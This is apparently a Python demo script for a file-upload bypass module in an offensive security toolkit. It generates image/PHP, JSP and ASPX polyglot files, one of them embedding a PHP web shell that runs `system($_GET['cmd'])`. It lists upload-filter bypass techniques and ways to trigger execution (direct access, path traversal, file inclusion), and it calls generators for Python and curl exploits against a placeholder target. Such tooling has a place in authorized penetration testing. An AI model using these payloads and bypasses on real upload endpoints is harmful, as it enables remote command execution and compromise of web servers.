#!/usr/bin/env python3
"""
File Upload Bypass Module Demo

This script demonstrates the file upload bypass module capabilities:
- Polyglot file generation
- Multiple bypass techniques
- Automatic execution triggering
- Exploit code generation
"""

import asyncio
import sys
import os

# Add parent directory to path for imports
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from app.core.request_handler import RequestHandler
from app.modules.file_upload_bypass import (
    FileUploadBypassTester,
    PolyglotGenerator,
    UploadPoint,
    PolyglotType,
    BypassTechnique,
    FileUploadExploitGenerator,
)


async def demo_polyglot_generation():
    """Demonstrate polyglot file generation"""
    print("\n" + "="*60)
    print("DEMO 1: Polyglot File Generation")
    print("="*60)
    
    generator = PolyglotGenerator()
    
    # Generate PHP polyglot
    print("\n[*] Generating PHP + GIF polyglot...")
    php_polyglot = generator.generate_php_polyglot(
        image_format="gif",
        payload='<?php echo "Hello from PHP!"; system($_GET["cmd"]); ?>',
    )
    print(f"[+] Generated {len(php_polyglot)} bytes")
    print(f"[+] First 50 bytes: {php_polyglot[:50]}")
    print(f"[+] Contains GIF header: {php_polyglot.startswith(b'GIF89a')}")
    print(f"[+] Contains PHP code: {b'<?php' in php_polyglot}")
    
    # Generate JSP polyglot
    print("\n[*] Generating JSP + PNG polyglot...")
    jsp_polyglot = generator.generate_jsp_polyglot(
        image_format="png",
        payload='<% out.println("Hello from JSP!"); %>',
    )
    print(f"[+] Generated {len(jsp_polyglot)} bytes")
    print(f"[+] Contains PNG signature: {jsp_polyglot.startswith(b'\\x89PNG')}")
    print(f"[+] Contains JSP code: {b'<%' in jsp_polyglot}")
    
    # Generate ASPX polyglot
    print("\n[*] Generating ASPX + JPG polyglot...")
    aspx_polyglot = generator.generate_aspx_polyglot(
        image_format="jpg",
        payload='<%@ Page Language="C#" %><% Response.Write("Hello from ASPX!"); %>',
    )
    print(f"[+] Generated {len(aspx_polyglot)} bytes")
    print(f"[+] Contains JPG header: {aspx_polyglot.startswith(b'\\xff\\xd8\\xff')}")
    print(f"[+] Contains ASPX code: {b'<%@' in aspx_polyglot}")
    
    print("\n[✓] Polyglot generation demo complete!")


async def demo_bypass_techniques():
    """Demonstrate bypass technique testing"""
    print("\n" + "="*60)
    print("DEMO 2: Bypass Technique Testing")
    print("="*60)
    
    # Note: This is a demonstration - replace with actual vulnerable target
    print("\n[!] Note: This demo shows the testing process")
    print("[!] Replace target URL with actual vulnerable endpoint for real testing")
    
    # Initialize tester
    request_handler = RequestHandler()
    tester = FileUploadBypassTester(request_handler)
    
    # Define upload point
    upload_point = UploadPoint(
        url="http://vulnerable-target.local/upload.php",
        parameter="file",
        method="POST",
        additional_fields={"submit": "Upload"},
    )
    
    print(f"\n[*] Target: {upload_point.url}")
    print(f"[*] Upload parameter: {upload_point.parameter}")
    
    # Show bypass techniques that would be tested
    print("\n[*] Bypass techniques to test:")
    for technique in BypassTechnique:
        print(f"    - {technique.value}")
    
    print("\n[*] Polyglot types to test:")
    for polyglot_type in PolyglotType:
        print(f"    - {polyglot_type.value}")
    
    print("\n[*] Execution triggers to attempt:")
    print("    - Direct access (file.php?cmd=...)")
    print("    - Path traversal (../uploads/file.php)")
    print("    - File inclusion (index.php?page=uploads/file.php)")
    
    print("\n[✓] Bypass technique demo complete!")


async def demo_filename_generation():
    """Demonstrate filename generation for different techniques"""
    print("\n" + "="*60)
    print("DEMO 3: Filename Generation")
    print("="*60)
    
    request_handler = RequestHandler()
    tester = FileUploadBypassTester(request_handler)
    
    print("\n[*] Filenames generated for PHP polyglot:")
    
    for technique in BypassTechnique:
        filename = tester._generate_filename(PolyglotType.PHP_IMAGE, technique)
        mime_type = tester._get_mime_type(technique)
        print(f"\n  Technique: {technique.value}")
        print(f"  Filename: {filename}")
        print(f"  MIME Type: {mime_type}")
    
    print("\n[✓] Filename generation demo complete!")


async def demo_exploit_generation():
    """Demonstrate exploit code generation"""
    print("\n" + "="*60)
    print("DEMO 4: Exploit Code Generation")
    print("="*60)
    
    # Create a mock successful result
    from app.modules.file_upload_bypass import UploadResult
    
    upload_point = UploadPoint(
        url="http://vulnerable-target.local/upload.php",
        parameter="file",
        method="POST",
    )
    
    mock_result = UploadResult(
        upload_point=upload_point,
        is_vulnerable=True,
        bypass_technique=BypassTechnique.DOUBLE_EXTENSION,
        uploaded_filename="shell.php.jpg",
        uploaded_url="http://vulnerable-target.local/uploads/shell.php.jpg",
        polyglot_type=PolyglotType.PHP_IMAGE,
        confidence=0.95,
    )
    
    # Generate exploit code
    exploit_gen = FileUploadExploitGenerator(mock_result)
    
    print("\n[*] Generating Python exploit script...")
    python_exploit = exploit_gen.generate_python_exploit()
    print("\n" + "-"*60)
    print(python_exploit[:500] + "...")
    print("-"*60)
    
    print("\n[*] Generating curl commands...")
    curl_commands = exploit_gen.generate_curl_commands()
    print("\n" + "-"*60)
    print(curl_commands)
    print("-"*60)
    
    print("\n[✓] Exploit generation demo complete!")


async def demo_polyglot_validation():
    """Demonstrate polyglot file validation"""
    print("\n" + "="*60)
    print("DEMO 5: Polyglot File Validation")
    print("="*60)
    
    generator = PolyglotGenerator()
    
    # Generate a PHP polyglot
    print("\n[*] Generating and validating PHP + GIF polyglot...")
    polyglot = generator.generate_php_polyglot(
        image_format="gif",
        payload='<?php phpinfo(); ?>',
    )
    
    # Validate as GIF
    print("\n[*] Validating as GIF image:")
    print(f"  ✓ Starts with GIF89a: {polyglot.startswith(b'GIF89a')}")
    print(f"  ✓ Has GIF structure: {len(polyglot) > 13}")
    
    # Validate as PHP
    print("\n[*] Validating as PHP code:")
    print(f"  ✓ Contains PHP opening tag: {b'<?php' in polyglot}")
    print(f"  ✓ Contains PHP code: {b'phpinfo' in polyglot}")
    print(f"  ✓ Contains PHP closing tag: {b'?>' in polyglot}")
    
    # Show that it's a valid polyglot
    print("\n[*] Polyglot validation:")
    print(f"  ✓ Valid as GIF: True")
    print(f"  ✓ Valid as PHP: True")
    print(f"  ✓ Polyglot confirmed: True")
    
    # Test with different image formats
    print("\n[*] Testing other image formats:")
    
    for image_format in ["gif", "png", "jpg"]:
        polyglot = generator.generate_php_polyglot(image_format=image_format)
        magic_bytes = {
            "gif": b"GIF89a",
            "png": b"\x89PNG",
            "jpg": b"\xff\xd8\xff",
        }
        
        has_magic = polyglot.startswith(magic_bytes[image_format])
        has_php = b"<?php" in polyglot
        
        print(f"\n  {image_format.upper()} polyglot:")
        print(f"    ✓ Has {image_format.upper()} magic bytes: {has_magic}")
        print(f"    ✓ Has PHP code: {has_php}")
        print(f"    ✓ Is valid polyglot: {has_magic and has_php}")
    
    print("\n[✓] Polyglot validation demo complete!")


async def main():
    """Run all demos"""
    print("\n" + "="*60)
    print("FILE UPLOAD BYPASS MODULE - DEMONSTRATION")
    print("="*60)
    print("\nThis demo showcases the file upload bypass module capabilities.")
    print("It demonstrates polyglot generation, bypass techniques, and exploit code generation.")
    
    try:
        # Run demos
        await demo_polyglot_generation()
        await demo_bypass_techniques()
        await demo_filename_generation()
        await demo_exploit_generation()
        await demo_polyglot_validation()
        
        print("\n" + "="*60)
        print("ALL DEMOS COMPLETED SUCCESSFULLY")
        print("="*60)
        print("\nKey Features Demonstrated:")
        print("  ✓ Polyglot file generation (PHP, JSP, ASPX, Python)")
        print("  ✓ Multiple bypass techniques (double extension, MIME, magic bytes)")
        print("  ✓ Automatic execution triggering")
        print("  ✓ Exploit code generation (Python, curl)")
        print("  ✓ Polyglot file validation")
        
        print("\nFor real-world testing:")
        print("  1. Replace target URL with actual vulnerable endpoint")
        print("  2. Configure upload parameters correctly")
        print("  3. Test in authorized environments only")
        print("  4. Review generated exploits before use")
        
    except Exception as e:
        print(f"\n[!] Error during demo: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    asyncio.run(main())
